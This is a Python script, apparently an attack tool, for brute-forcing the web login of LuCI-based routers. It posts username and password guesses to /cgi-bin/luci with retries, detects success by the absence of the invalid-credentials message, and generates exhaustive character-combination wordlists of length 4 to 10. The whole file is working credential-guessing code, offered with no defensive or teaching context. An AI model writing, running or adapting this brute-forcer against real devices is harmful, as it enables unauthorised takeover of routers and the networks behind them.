import sys
import requests
import itertools
import multiprocessing
from time import sleep

MAX_RETRIES = 3

def login(host, username, password):
    count = 0
    result = {
        'username': username,
        'password': password
    }
    while count < MAX_RETRIES:
        try:
            headers = {
                'Connection': 'keep-alive',
                'Pragma': 'no-cache',
                'Cache-Control': 'no-cache',
                'Upgrade-Insecure-Requests': '1',
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'Referer': 'http://192.168.2.1/cgi-bin/luci',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'en-US,en;q=0.9',
            }

            data = [
                ('page', 'login'),
                ('username', username),
                ('password', password),
            ]

            url = 'http://{}/cgi-bin/luci'.format(host)
            response = requests.post(url, headers=headers, data=data, timeout=5)
            result['response'] = response
            break
        except Exception as e:
            count += 1
            sleep(0.5)
            result['exception'] = e
            continue
    return result


def is_success(result):
    return 'Invalid username and/or password!' not in result.text


def create_wordlist(chrs, min_length=4, max_length=10):
    if min_length > max_length:
        print ('[!] Please `min_length` must smaller or same as with `max_length`')
        sys.exit(1)

    for n in range(min_length, max_length + 1):
        for xs in itertools.product(chrs, repeat=n):
            chars = ''.join(xs)
            yield chars
